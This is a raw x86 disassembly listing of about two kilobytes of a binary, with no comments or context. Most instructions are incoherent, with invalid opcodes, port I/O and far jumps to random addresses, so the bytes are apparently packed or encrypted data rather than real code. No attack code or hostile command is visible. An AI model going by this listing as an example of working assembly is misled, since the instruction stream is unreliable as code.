  411225:	mov    fs,WORD PTR [eax]
  411227:	in     al,0xef
  411229:	ss push es
  41122b:	aas    
  41122c:	xor    al,0xc9
  41122e:	xchg   ebp,eax
  41122f:	dec    ecx
  411230:	xor    ecx,DWORD PTR [esi+0x18b36a28]
  411236:	dec    edi
  411237:	test   edi,esi
  411239:	xchg   esp,eax
  41123a:	stc    
  41123b:	push   0x5c26eee2
  411240:	mov    bh,0x4f
  411242:	pushf  
  411243:	push   ebx
  411244:	sub    al,0x32
  411246:	pop    eax
  411247:	pop    ss
  411248:	retf   
  411249:	mov    ah,0x4
  41124b:	or     al,0x6a
  41124d:	pop    eax
  41124e:	pop    ds
  41124f:	(bad)
  411253:	mov    ebx,0xd612d954
  411258:	stos   DWORD PTR es:[edi],eax
  411259:	push   ebp
  41125b:	dec    esi
  41125c:	in     eax,0xac
  41125e:	mov    ebx,0x2888bb99
  411263:	jne    0x4112d9
  411265:	loope  0x4111f1
  411267:	push   ds
  411268:	mov    edi,0xc7ce0ac4
  41126d:	push   esi
  41126e:	in     eax,0x98
  411270:	push   cs
  411271:	in     eax,0x7f
  411273:	mov    esp,0x85d7d5e3
  411278:	test   eax,0x82c1ab87
  41127d:	mov    eax,ds:0x6332f8f3
  411282:	call   0xe6a320f8
  411287:	pop    ss
  411288:	cmp    eax,0xe613ec29
  41128d:	mov    cl,0xac
  41128f:	bound  edi,QWORD PTR [edi]
  411291:	cmp    al,0x72
  411293:	ss gs repz mov bh,0xdf
  411298:	push   ebp
  411299:	pusha  
  41129a:	ins    DWORD PTR es:[edi],dx
  41129b:	dec    ecx
  41129c:	mov    eax,ds:0x58d84107
  4112a1:	pushf  
  4112a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4112a3:	ja     0x411271
  4112a5:	movhps xmm6,QWORD PTR [ebp+edx*1+0x94e02fb]
  4112ad:	mov    ebx,0x6abc0cc2
  4112b2:	pop    ebp
  4112b3:	loope  0x411265
  4112b5:	not    DWORD PTR [edx]
  4112b7:	loopne 0x41130c
  4112b9:	popa   
  4112ba:	and    esp,DWORD PTR [eax+0x3f]
  4112bd:	in     eax,dx
  4112be:	and    eax,0xb46ec09c
  4112c3:	mov    bl,0x5
  4112c5:	out    0x77,eax
  4112c7:	xor    al,0x5a
  4112c9:	test   dl,bh
  4112cb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4112cc:	adc    BYTE PTR [esi+0x3a],bh
  4112cf:	rol    DWORD PTR [esi],cl
  4112d1:	sub    al,0x39
  4112d3:	in     eax,0xfd
  4112d5:	xchg   ebp,eax
  4112d6:	fisttp WORD PTR [esi]
  4112d8:	mov    ecx,0x9121be18
  4112dd:	mov    ch,0xd3
  4112df:	mov    ds:0xc21897a4,al
  4112e4:	shl    DWORD PTR [ecx+0x5146ef79],0xfc
  4112eb:	xor    al,0x34
  4112ed:	call   0xbb41:0x11e0949e
  4112f4:	jl     0x4112f8
  4112f6:	call   0x724f60da
  4112fb:	xchg   edx,eax
  4112fc:	jl     0x4112b9
  4112fe:	xchg   edi,eax
  4112ff:	jb     0x41128e
  411301:	mov    dh,0xda
  411303:	or     BYTE PTR [esi],0x1a
  411306:	xor    ch,BYTE PTR [ebp-0x692c2c62]
  41130c:	js     0x41132e
  41130e:	jecxz  0x4112cb
  411310:	inc    ebx
  411311:	mov    ch,0x55
  411313:	or     eax,0x1a87bbba
  411318:	pop    edi
  411319:	loope  0x4112c5
  41131b:	(bad)  
  41131c:	fld    TBYTE PTR [ebp+0x70c40a21]
  411322:	lock retf 0x3e60
  411326:	inc    edi
  411327:	or     DWORD PTR [ebp-0x412e266f],esi
  41132d:	je     0x4112de
  41132f:	adc    BYTE PTR [eax-0x11],bl
  411332:	xor    edi,eax
  411334:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411335:	mov    ah,0xf1
  411337:	jl     0x41135d
  411339:	push   0xad71f7f0
  41133e:	pop    edx
  41133f:	or     eax,0x9ed9ae2b
  411344:	xor    bh,0x47
  411347:	stc    
  411348:	mov    ebx,DWORD PTR [edx]
  41134a:	xor    DWORD PTR [eax-0x5],edx
  41134d:	or     BYTE PTR [edx+0x34],bh
  411350:	jle    0x4113ae
  411352:	adc    BYTE PTR [ebp+0x45],ah
  411355:	sbb    al,0xf6
  411357:	fmul   DWORD PTR [edi+0x3b214694]
  41135d:	stos   BYTE PTR es:[edi],al
  41135e:	mov    ebp,0xa5ff0eae
  411363:	xor    DWORD PTR [eax+0x60a6f3b],0x7
  41136a:	xchg   DWORD PTR [esi+0x22],esp
  41136d:	scas   al,BYTE PTR es:[edi]
  41136e:	sar    DWORD PTR [ebx-0x1e67b352],1
  411374:	add    dl,BYTE PTR ds:0x597040f8
  41137a:	push   esi
  41137b:	mov    bh,0x9e
  41137d:	xchg   edx,eax
  41137e:	leave  
  41137f:	aam    0x44
  411381:	pop    esp
  411382:	or     DWORD PTR [edx+0x23d203b3],0xffffff82
  411389:	fidivr WORD PTR [eax-0x49796ae7]
  41138f:	xchg   DWORD PTR ds:0x15abe56c,edx
  411395:	push   ebx
  411396:	cwde   
  411397:	outs   dx,DWORD PTR ds:[esi]
  411398:	and    eax,edx
  41139a:	mov    dh,0x30
  41139c:	pop    edi
  41139d:	sbb    dl,dh
  41139f:	xor    esi,DWORD PTR [eax-0x76]
  4113a2:	pop    eax
  4113a3:	mov    dl,0xc5
  4113a5:	ror    DWORD PTR [ebp-0x79242bd7],1
  4113ab:	pushf  
  4113ac:	or     BYTE PTR [esi+0x79],ah
  4113af:	and    bl,dh
  4113b1:	(bad)  
  4113b2:	xor    esp,DWORD PTR [esp+esi*8+0x37]
  4113b6:	pop    es
  4113b7:	jb     0x4113a0
  4113b9:	jne    0x411426
  4113bb:	scas   eax,DWORD PTR es:[edi]
  4113bc:	xor    al,0x8b
  4113be:	shr    BYTE PTR [ecx],cl
  4113c0:	loope  0x4113ad
  4113c2:	dec    ebx
  4113c3:	shl    BYTE PTR [ebp+0x3a25bbf8],0x9a
  4113ca:	int    0xb8
  4113cc:	adc    cl,dh
  4113ce:	xchg   ebx,eax
  4113cf:	inc    edx
  4113d0:	xchg   ecx,eax
  4113d1:	pop    ss
  4113d2:	mov    DWORD PTR [edi],esp
  4113d4:	ja     0x4113c8
  4113d6:	test   al,0x76
  4113d8:	aam    0x9c
  4113da:	dec    ecx
  4113db:	mov    ah,0x38
  4113dd:	(bad)  
  4113de:	fst    DWORD PTR [edx+eiz*4]
  4113e1:	in     al,0x4e
  4113e3:	jge    0x4113ed
  4113e5:	cmp    BYTE PTR ds:0x277e5d80,bl
  4113eb:	out    dx,eax
  4113ec:	inc    ebp
  4113ed:	ficomp DWORD PTR [ebx-0x6df2bd0]
  4113f3:	jb     0x411397
  4113f5:	outs   dx,DWORD PTR ds:[esi]
  4113f6:	inc    esi
  4113f7:	clc    
  4113f8:	out    dx,eax
  4113f9:	mov    bl,0xa7
  4113fb:	in     eax,dx
  4113fc:	dec    eax
  4113fd:	out    dx,al
  4113fe:	fisub  WORD PTR [esi+edx*8-0x76a117c8]
  411405:	fs sbb edi,edx
  411408:	pop    edi
  411409:	xor    al,0x1c
  41140b:	(bad)  
  41140c:	or     ecx,DWORD PTR [edx+0x16]
  41140f:	ins    BYTE PTR es:[edi],dx
  411410:	adc    al,0x2d
  411412:	adc    al,0x80
  411414:	jmp    0x41139a
  411416:	fs push cs
  411418:	ds dec eax
  41141a:	pushf  
  41141b:	sahf   
  41141c:	mov    al,0xc8
  41141e:	dec    esp
  41141f:	jg     0x4113ff
  411421:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411422:	sbb    ecx,ebx
  411424:	dec    ecx
  411425:	xchg   ebx,eax
  411426:	mov    dl,0x4b
  411428:	pop    es
  411429:	push   es
  41142a:	fmul   QWORD PTR ds:0xb8944688
  411430:	xor    DWORD PTR [esi+0x4d],ecx
  411433:	out    0xdf,al
  411435:	xor    dl,bl
  411437:	mov    ebx,0x44ef1180
  41143c:	sub    esi,ecx
  41143e:	inc    edi
  41143f:	repz mov eax,0x5fff1a45
  411445:	mov    bl,0xa9
  411447:	xchg   ebx,eax
  411448:	lods   eax,DWORD PTR ds:[esi]
  411449:	xor    al,0x1e
  41144b:	nop
  41144c:	jbe    0x411480
  41144e:	jmp    0x4114c4
  411450:	xchg   edi,eax
  411451:	nop
  411452:	cmp    ebx,DWORD PTR [ebx]
  411454:	arpl   WORD PTR [esp+esi*8-0x278b103],di
  41145b:	or     al,0xd6
  41145d:	mov    es,WORD PTR ds:0x6bdf41b5
  411463:	in     eax,dx
  411464:	aam    0xcb
  411466:	out    dx,al
  411467:	pop    ebx
  411468:	and    BYTE PTR [edx+esi*8-0x6edeef27],ch
  41146f:	push   eax
  411470:	or     al,0x58
  411472:	scas   al,BYTE PTR es:[edi]
  411473:	xchg   ebx,eax
  411474:	inc    ebp
  411475:	xor    edx,edx
  411477:	in     eax,dx
  411478:	arpl   WORD PTR [eax],di
  41147a:	mov    edx,0x3bfc2a1b
  41147f:	loop   0x41142c
  411481:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411482:	ins    DWORD PTR es:[edi],dx
  411483:	(bad)  
  411484:	mov    ds:0xa8769cbe,eax
  411489:	pop    esi
  41148a:	push   ecx
  41148b:	cmp    eax,0x5d4570b3
  411490:	clc    
  411491:	adc    al,0x77
  411493:	dec    ebx
  411494:	xchg   esp,eax
  411495:	mov    bh,0xad
  411497:	mov    bl,0x89
  411499:	mov    edi,0xad32d9b7
  41149e:	jb     0x4114d9
  4114a0:	sbb    al,0x97
  4114a2:	push   0xffffffc3
  4114a4:	mov    eax,ds:0xe8468ff8
  4114a9:	arpl   WORD PTR [edx],cx
  4114ab:	mov    ch,0x26
  4114ad:	and    edx,0x8d274b90
  4114b3:	pop    ss
  4114b4:	xchg   ebx,eax
  4114b5:	sbb    esp,DWORD PTR [esi+ecx*4]
  4114b8:	inc    ebx
  4114b9:	es rcl esi,cl
  4114bc:	jmp    0x7b95:0x7a599577
  4114c3:	cmp    eax,0x88bad5a
  4114c8:	inc    esi
  4114c9:	sbb    BYTE PTR [ebx+0x2b],dh
  4114cc:	mov    ebp,0x5ba00bfc
  4114d1:	jbe    0x41153e
  4114d3:	jns    0x41153d
  4114d5:	xchg   edi,eax
  4114d6:	lahf   
  4114d7:	clc    
  4114d8:	sahf   
  4114d9:	push   ebx
  4114da:	mov    bl,0x65
  4114dc:	into   
  4114dd:	ficom  WORD PTR [esi]
  4114df:	push   eax
  4114e0:	jge    0x4114c5
  4114e2:	aaa    
  4114e3:	or     al,0xbf
  4114e5:	in     al,dx
  4114e6:	scas   eax,DWORD PTR es:[edi]
  4114e7:	or     ecx,ecx
  4114e9:	cmp    dl,BYTE PTR [esp+ecx*4-0x3f]
  4114ed:	mov    BYTE PTR [esi],bl
  4114ef:	add    BYTE PTR [ebx-0x1c],bh
  4114f2:	lahf   
  4114f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4114f4:	mov    cl,0xcd
  4114f6:	and    edx,0x25
  4114f9:	mov    ecx,0xae667e42
  4114fe:	rdtsc  
  411500:	mov    ebx,0x1857e726
  411505:	ja     0x411515
  411507:	scas   al,BYTE PTR es:[edi]
  411508:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411509:	push   edx
  41150a:	dec    ebx
  41150b:	das    
  41150c:	jmp    0xdd673396
  411511:	cmp    BYTE PTR [edx],al
  411513:	test   eax,0x205ef110
  411518:	mov    ch,0xe1
  41151a:	in     al,dx
  41151b:	mov    WORD PTR [edi+0x310e1d06],ss
  411521:	out    0x73,eax
  411523:	add    al,0xf0
  411525:	stos   BYTE PTR es:[edi],al
  411526:	cmp    bh,BYTE PTR [ebx-0x64ea518b]
  41152c:	mov    ds:0xefaf0e47,al
  411531:	lock mov ecx,0x8c50cd23
  411537:	shr    BYTE PTR [ecx],0x1c
  41153a:	push   esp
  41153b:	and    bl,bh
  41153d:	add    BYTE PTR [esi+0x5cd81c57],0x3
  411544:	fcom   DWORD PTR [esi-0x67]
  411547:	and    cl,ch
  411549:	jb     0x41156c
  41154b:	adc    cl,0xb0
  41154e:	nop
  41154f:	and    eax,0x55f1a020
  411554:	les    esi,FWORD PTR [ecx+0x26f98a07]
  41155a:	mov    ah,0x1b
  41155d:	enter  0x698e,0x92
  411561:	mov    ecx,0x616a7e00
  411566:	cmp    ebx,DWORD PTR [edx+eax*2+0x51]
  41156a:	xchg   ecx,eax
  41156b:	mov    dl,0xed
  41156d:	cmp    eax,0x55ce44a1
  411572:	adc    eax,ebx
  411574:	int3   
  411575:	rcr    DWORD PTR ds:0x266fa0b9,cl
  41157b:	int3   
  41157c:	adc    DWORD PTR [edx+0x68],ebx
  41157f:	push   ebx
  411580:	shl    DWORD PTR [edi+0x33],0x55
  411584:	enter  0x1d2f,0x6
  411588:	jmp    0x4115b9
  41158a:	pop    es
  41158b:	pop    eax
  41158c:	mov    edx,0xf2d2ebc5
  411591:	mov    esi,0xb11a598b
  411596:	or     ebx,DWORD PTR [ebx]
  411598:	push   ebp
  411599:	imul   esi,DWORD PTR [edx+0xac63aab],0x75
  4115a0:	sahf   
  4115a1:	push   ds
  4115a2:	test   esp,esi
  4115a4:	arpl   WORD PTR [edx-0x47],sp
  4115a7:	mov    ebp,0x80449bc2
  4115ac:	fnstsw WORD PTR [ebx-0x5807d45c]
  4115b2:	mov    eax,0xe52dfa3b
  4115b7:	gs dec ebp
  4115b9:	popf   
  4115ba:	ja     0x4115ae
  4115bc:	push   es
  4115bd:	sbb    eax,0x3433b0cd
  4115c2:	stos   DWORD PTR es:[edi],eax
  4115c3:	add    BYTE PTR [esi-0x7b47d5bd],0x6d
  4115ca:	(bad)  
  4115cb:	imul   edx,DWORD PTR [ebx-0x71d1e3d],0x35a6b21
  4115d5:	clc    
  4115d6:	les    ebx,FWORD PTR [eax-0x80]
  4115d9:	(bad)  
  4115da:	and    BYTE PTR [esi-0x1c],dl
  4115dd:	cmc    
  4115de:	inc    ebp
  4115df:	mov    dh,0xb5
  4115e1:	mov    edx,DWORD PTR [ebp+0x14]
  4115e4:	xor    eax,ecx
  4115e6:	add    eax,esi
  4115e8:	imul   eax,DWORD PTR [edx]
  4115eb:	mov    edx,DWORD PTR [ebp-0x4]
  4115ee:	xor    edx,ecx
  4115f0:	mov    ecx,DWORD PTR [ebp+0x8]
  4115f3:	lea    ecx,[edx+ecx*1+0x32729c]
  4115fa:	cmp    ecx,eax
  4115fc:	jmp    0x4119f0
  411601:	mov    ebx,0x93838448
  411606:	push   ebx
  411607:	mov    ebx,0x78da0248
  41160c:	bound  edx,QWORD PTR [edi+esi*8]
  41160f:	jl     0x4115b2
  411611:	out    dx,al
  411612:	inc    eax
  411613:	jo     0x411685
  411615:	dec    ecx
  411616:	jge    0x411688
  411618:	jo     0x4115a2
  41161a:	loope  0x4115ac
  41161c:	xor    edx,edi
  41161e:	lea    ebx,[ecx-0x2d989f64]
  411624:	or     ch,BYTE PTR [ebp-0x7c]
  411627:	ins    BYTE PTR es:[edi],dx
  411628:	jns    0x41166c
  41162a:	fidivr WORD PTR [ecx+0x63]
  41162d:	xchg   edi,eax
  41162e:	pop    es
  41162f:	ss push ss
  411631:	test   al,0x3c
  411633:	sub    esp,DWORD PTR [eax+0x100ce174]
  411639:	and    BYTE PTR [eax],ch
  41163b:	sbb    bl,dh
  41163d:	mov    ds:0x1173c17e,eax
  411642:	icebp  
  411643:	pop    ebp
  411644:	pop    ss
  411645:	ss stos BYTE PTR es:[edi],al
  411647:	mov    dh,0x58
  411649:	popf   
  41164a:	sub    dh,BYTE PTR [ebp+0x32e7437f]
  411650:	leave  
  411651:	xchg   ebp,eax
  411652:	mov    BYTE PTR [edi-0x35],dh
  411655:	lds    eax,FWORD PTR [ebx]
  411657:	cmc    
  411658:	mov    edi,0x7f43cfa7
  41165d:	cdq    
  41165e:	cmp    ah,ah
  411660:	mov    edi,0xd57b9dc6
  411665:	xlat   BYTE PTR ds:[ebx]
  411666:	cmp    BYTE PTR [edx-0x69],ch
  411669:	adc    DWORD PTR [edx-0x7583dbbb],ebp
  41166f:	int3   
  411670:	js     0x4116b9
  411672:	sahf   
  411673:	xor    ecx,ecx
  411675:	sub    al,0xa
  411677:	adc    al,0x70
  411679:	div    BYTE PTR [ebx]
  41167b:	fwait
  41167c:	push   0xe3dbe4a2
  411681:	dec    edx
  411682:	jl     0x411692
  411684:	cmp    BYTE PTR [edi-0x5c],ch
  411687:	(bad)  
  411689:	jno    0x411618
  41168b:	lods   eax,DWORD PTR ds:[esi]
  41168c:	fbld   TBYTE PTR ds:0xa914a0be
  411692:	sbb    eax,0xd5e230b8
  411697:	aaa    
  411698:	stc    
  411699:	xor    dl,dh
  41169b:	outs   dx,DWORD PTR ds:[esi]
  41169c:	daa    
  41169d:	repnz pusha 
  41169f:	and    eax,0x43cf815f
  4116a4:	cli    
  4116a5:	mov    bh,0xf4
  4116a7:	push   ebx
  4116a8:	or     al,0xa0
  4116aa:	scas   eax,DWORD PTR es:[edi]
  4116ab:	adc    BYTE PTR [esi],ah
  4116ad:	dec    esi
  4116ae:	sub    DWORD PTR [edi-0x2a3a9702],edx
  4116b4:	cmp    edi,DWORD PTR [edx+0x20]
  4116b7:	test   al,0xf5
  4116ba:	out    dx,al
  4116bb:	sti    
  4116bc:	shl    ebp,cl
  4116be:	rcr    BYTE PTR ds:0x867503d7,cl
  4116c4:	cdq    
  4116c5:	test   eax,0x849587ed
  4116ca:	fcmovne st,st(2)
  4116cc:	dec    edi
  4116cd:	jle    0x411672
  4116cf:	lods   eax,DWORD PTR ds:[esi]
  4116d0:	je     0x4116a2
  4116d2:	retf   
  4116d3:	mov    dl,BYTE PTR [ecx-0x64]
  4116d6:	adc    ebp,DWORD PTR [ecx]
  4116d8:	aaa    
  4116d9:	dec    esi
  4116da:	push   edx
  4116db:	adc    ecx,DWORD PTR [esi-0x24aa93a]
  4116e1:	cmp    eax,0xc51bb59b
  4116e6:	lods   al,BYTE PTR ds:[esi]
  4116e7:	push   ebx
  4116e8:	fisubr WORD PTR [esi+esi*1]
  4116eb:	or     DWORD PTR [ebp-0x2b044f47],0xeac26316
  4116f5:	push   edx
  4116f6:	cmp    al,0xb6
  4116f8:	ins    DWORD PTR es:[edi],dx
  4116f9:	push   ss
  4116fa:	outs   dx,BYTE PTR ds:[esi]
  4116fb:	or     al,BYTE PTR [eax]
  4116fd:	pop    ebx
  4116fe:	adc    bh,BYTE PTR [esi+0x69283ab4]
  411704:	ja     0x4116d1
  411706:	mov    ds:0x6f3535d6,al
  41170b:	or     ecx,eax
  41170d:	add    ebx,DWORD PTR [ebp+edi*8+0x1ad7c98b]
  411714:	into   
  411715:	enter  0xc5ef,0x39
  411719:	push   eax
  41171a:	scas   al,BYTE PTR es:[edi]
  41171b:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  41171d:	sub    eax,0xdb1af6ed
  411722:	fwait
  411723:	sbb    DWORD PTR [eax-0x32ac1ac5],eax
  411729:	ins    DWORD PTR es:[edi],dx
  41172a:	fnsave [ebp-0x48]
  41172d:	inc    ecx
  41172e:	push   esp
  41172f:	jmp    0x194dd8a8
  411734:	adc    eax,0x12fd1e01
  411739:	mov    edx,eax
  41173b:	outs   dx,BYTE PTR ds:[esi]
  41173c:	push   ss
  41173d:	aad    0xa3
  41173f:	or     al,0xce
  411741:	call   0xf76d987a
  411746:	jae    0x411705
  411748:	fcom   QWORD PTR [edi-0x5]
  41174b:	sub    DWORD PTR [ebx+0x2386c6b5],ebx
  411751:	inc    ebx
  411752:	jg     0x411782
  411754:	jp     0x41175b
  411756:	test   BYTE PTR [ecx-0x4f],ah
  411759:	inc    edx
  41175a:	fldcw  WORD PTR [edi+0x79]
  41175d:	lock mov cl,0x2d
  411760:	stos   BYTE PTR es:[edi],al
  411761:	ret    0xb2b7
  411764:	mov    dh,0x66
  411766:	cwde   
  411767:	xchg   DWORD PTR [edi+ebx*2-0x19ca5d76],edi
  41176e:	mov    bl,dl
  411770:	not    DWORD PTR [edx-0x6e]
  411773:	mov    ch,0x7a
  411775:	rcl    ebp,1
  411777:	bound  eax,QWORD PTR [edx-0x6bf6a46d]
  41177d:	cli    
  41177e:	cdq    
  41177f:	in     eax,dx
  411780:	xor    BYTE PTR [esi],ah
  411782:	aam    0x24
  411784:	aam    0x57
  411786:	(bad)  
  411787:	shl    BYTE PTR [eax-0x643a387a],1
  41178d:	fidiv  WORD PTR [eax-0x3]
  411790:	lock pop ebp
  411792:	lds    esp,FWORD PTR [eax-0x42]
  411795:	es sub al,0x22
  411798:	pop    es
  411799:	inc    ebp
  41179a:	leave  
  41179b:	mov    ch,0x7e
  41179d:	pop    ebp
  41179e:	cmp    ebp,DWORD PTR ds:0x6f387819
  4117a4:	jmp    0x1ae0c0f1
  4117a9:	xchg   DWORD PTR [eax],ebx
  4117ab:	sub    BYTE PTR [edi-0x28],0x27
  4117af:	and    DWORD PTR [bx+si+0x16],edi
  4117b3:	dec    eax
  4117b4:	and    esi,DWORD PTR [ecx+0x353b3167]
  4117ba:	iret   
  4117bb:	fwait
  4117bc:	push   ss
  4117bd:	stc    
  4117be:	push   ebp
  4117bf:	push   ecx
  4117c0:	in     eax,dx
  4117c1:	mov    bl,0xd
  4117c3:	mov    ch,0x22
  4117c5:	fcomp  st(5)
  4117c7:	adc    eax,0xfbd87cb4
  4117cc:	fnstenv [edx+0x20f29664]
  4117d2:	out    dx,al
  4117d3:	mov    dl,0x31
  4117d5:	cdq    
  4117d6:	cmp    BYTE PTR [edi-0x2e],bh
  4117d9:	sbb    ebx,DWORD PTR [ebx-0x47fc6570]
  4117df:	xor    eax,DWORD PTR [esi+0x25]
  4117e2:	ret    
  4117e3:	or     al,0x92
  4117e5:	mov    WORD PTR [edi+edi*4+0x51],?
  4117e9:	pop    ss
  4117ea:	push   edi
  4117eb:	shl    BYTE PTR [ebx-0x2b],cl
  4117ee:	fstp   TBYTE PTR [ebx]
  4117f0:	mov    ebp,0x44a4f66b
  4117f5:	shr    BYTE PTR [ecx-0x429271d5],cl
  4117fb:	addr16 pop edi
  4117fd:	test   eax,0xd0e62000
  411802:	hlt    
  411803:	jmp    0x648a413
  411808:	pushf  
  411809:	shr    ebx,0x8d
  41180c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41180d:	stc    
  41180e:	push   edi
  41180f:	push   cs
  411810:	rcr    ebx,0x27
  411813:	push   0x25
  411815:	ds repz sub eax,esi
  411819:	lahf   
  41181a:	je     0x411831
  41181c:	sub    dl,0x1c
  41181f:	dec    edi
  411820:	mov    eax,0x900b579
  411825:	add    DWORD PTR [eax+0xe],edx
  411828:	sbb    al,0x66
  41182a:	inc    edx
  41182b:	xchg   ebx,eax
  41182c:	dec    ebp
  41182d:	test   al,0xf
  41182f:	repnz stc 
  411831:	imul   ebx,DWORD PTR [eax+0x4850cd36],0xd
  411838:	fistp  DWORD PTR [edi]
  41183a:	ss stos DWORD PTR es:[edi],eax
  41183c:	sbb    ebp,esi
  41183e:	push   esi
  41183f:	fidiv  DWORD PTR [ebp-0x55b34e45]
  411845:	fstp   DWORD PTR [ebx+0x3]
  411848:	or     al,0x86
  41184a:	arpl   WORD PTR [esi-0x774135bd],cx
  411850:	fldenv [esi-0x44]
  411853:	push   eax
  411854:	shl    BYTE PTR ds:0x402c5b8a,0xa9
  41185b:	mov    ebp,0x17adb50b
  411860:	int3   
  411861:	leave  
  411862:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411863:	xchg   BYTE PTR fs:[ebx+0x24],dl
  411867:	jnp    0x41189b
  411869:	mov    eax,0x6bb98ba3
  41186e:	xor    edx,esi
  411870:	fidivr WORD PTR [edx-0x236041b]
  411876:	cs retf 0x6324
  41187a:	std    
  41187b:	pminub mm4,QWORD PTR [edi]
  41187e:	or     DWORD PTR [edx-0x650cb817],ebx
  411884:	dec    eax
  411885:	sti    
  411886:	inc    edi
  411887:	repnz mov esp,0x977c4e0d
  41188d:	adc    eax,0xfc5dd36c
  411892:	daa    
  411893:	jno    0x41190a
  411895:	add    al,bl
  411897:	jl     0x411901
  411899:	mov    edi,DWORD PTR [ebp+edx*8+0x49046f33]
  4118a0:	xchg   esp,eax
  4118a1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4118a2:	adc    esp,DWORD PTR [esi-0x4]
  4118a5:	je     0x4118d7
  4118a7:	(bad)  
  4118a8:	arpl   WORD PTR [eax],cx
  4118aa:	into   
  4118ab:	push   ds
  4118ac:	add    ch,dh
  4118ae:	div    BYTE PTR [edx-0x7050005e]
  4118b4:	lods   eax,DWORD PTR ds:[esi]
  4118b5:	test   BYTE PTR [ebx],0xa5
  4118b8:	aaa    
  4118b9:	pop    edx
  4118ba:	and    bl,BYTE PTR [eax]
  4118bc:	js     0x4118e8
  4118be:	(bad)  
  4118bf:	(bad)  
  4118c0:	in     eax,dx
  4118c1:	mov    BYTE PTR [eax],bl
  4118c3:	push   esp
  4118c4:	cmp    eax,DWORD PTR [esi+ebp*4]
  4118c7:	adc    dh,BYTE PTR [esi-0x64]
  4118ca:	add    eax,0xbf69ca60
  4118cf:	lahf   
  4118d0:	sub    al,0xff
  4118d2:	dec    esi
  4118d3:	mov    bh,al
  4118d5:	sbb    al,0xe6
  4118d7:	adc    edx,ebp
  4118d9:	in     al,dx
  4118da:	lahf   
  4118db:	pop    es
  4118dc:	jmp    0xf51f245b
  4118e1:	mov    al,0x2d
  4118e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4118e4:	(bad)  
  4118e5:	retf   
  4118e6:	xchg   edi,eax
  4118e7:	or     eax,0xe94038f1
  4118ec:	ror    DWORD PTR [esi-0x10],0xe8
  4118f0:	cli    
  4118f1:	mov    esi,0xc3d060b0
  4118f6:	lds    edi,FWORD PTR [esi]
  4118f8:	xor    dh,dl
  4118fa:	outs   dx,DWORD PTR ds:[esi]
  4118fb:	inc    edx
  4118fc:	loop   0x411970
  4118fe:	je     0x41195f
  411900:	out    dx,al
  411901:	pop    esi
  411902:	add    al,al
  411904:	and    ebp,DWORD PTR [ebx+0x7f650f3b]
  41190a:	sub    BYTE PTR [ebp-0x13],ch
  41190d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41190e:	push   cs
  41190f:	cmc    
  411910:	repz xchg edx,eax
  411912:	fst    DWORD PTR [edx]
  411914:	or     bl,bl
  411916:	scas   al,BYTE PTR es:[edi]
  411917:	and    al,0xff
  411919:	mov    bl,0x13
  41191b:	pusha  
  41191c:	jle    0x411942
  41191e:	ret    0xc9b5
  411921:	inc    eax
  411922:	popf   
  411923:	lea    ebx,[eax+esi*1]
  411926:	inc    esi
  411927:	cmp    dl,ch
  411929:	xlat   BYTE PTR ds:[ebx]
  41192a:	sbb    BYTE PTR [esi-0x7991b873],al
  411930:	popf   
  411931:	popa   
  411932:	inc    esi
  411933:	cmp    DWORD PTR [ecx+0x7710341a],0x493f2247
  41193d:	mov    ds:0x17458691,eax
  411942:	out    0xb0,al
  411944:	sbb    ch,dl
  411946:	cmp    BYTE PTR [ebp-0x11d555a],cl
  41194c:	sub    al,0x12
  41194e:	lods   eax,DWORD PTR ds:[esi]
  41194f:	test   ch,dh
  411951:	pop    ds
  411952:	call   0xe79:0x467ca3a8
  411959:	or     al,0x81
  41195b:	lods   al,BYTE PTR ds:[esi]
  41195c:	jge    0x4119ac
  41195e:	xchg   esp,eax
  41195f:	jne    0x411931
  411961:	sti    
  411962:	xor    edi,DWORD PTR [edx+ebp*2]
  411965:	cmp    eax,eax
  411967:	xchg   BYTE PTR [eax+eax*1-0x6ee28548],ch
  41196e:	mov    edi,0x6dc4d8fe
  411973:	(bad)  
  411974:	dec    ebx
  411975:	add    al,0xac
  411977:	ret    
  411978:	aad    0x33
  41197a:	push   es
  41197b:	bound  ebp,QWORD PTR [ebp-0x5d68f43e]
  411981:	mov    BYTE PTR [eax+0x3aa4e43f],ch
  411987:	inc    esi
  411988:	or     ebx,edi
  41198a:	out    dx,al
  41198b:	or     DWORD PTR [edi+eax*4-0x4344b442],esp
  411992:	mov    ?,esi
  411994:	pop    ecx
  411995:	es repnz xchg edi,eax
  411998:	test   al,0x2a
  41199a:	ficom  DWORD PTR [edx-0x10]
  41199d:	dec    esi
  41199e:	xor    eax,0xd78a9a33
  4119a3:	and    al,ah
  4119a5:	add    BYTE PTR [eax+esi*2],0xc8
  4119a9:	push   esp
  4119aa:	pop    ecx
  4119ab:	aaa    
  4119ac:	dec    edx
  4119ad:	loopne 0x411a05
  4119af:	inc    eax
  4119b0:	xor    BYTE PTR [ebx+0x409dac31],al
  4119b6:	sbb    DWORD PTR [ebp+0x31],esi
  4119b9:	sti    
  4119ba:	fnstenv [ebx-0x78]
  4119bd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4119be:	fwait
  4119bf:	mov    ah,0x27
  4119c1:	cs call 0x1713e00e
  4119c7:	mov    ch,BYTE PTR [esp+edi*8+0x5a]
  4119cb:	loopne 0x4119b4
  4119cd:	or     eax,0x6ada752b
  4119d2:	shl    BYTE PTR [ecx],0xb6
  4119d5:	pop    es
  4119d6:	dec    ecx
  4119d7:	inc    ebx
  4119d8:	push   esp
  4119d9:	xor    BYTE PTR [edi],cl
  4119db:	inc    edi
  4119dc:	ret    0x48ff
  4119df:	test   BYTE PTR [ebp-0x65],0xb4
  4119e3:	push   ebp
  4119e4:	(bad)  
  4119e5:	jmp    0x77ae:0xdcbd42a0
  4119ec:	push   esi
  4119ed:	sbb    BYTE PTR [ecx],0x0
  4119f0:	jne    0x4109bc
  4119f6:	mov    ebx,esi
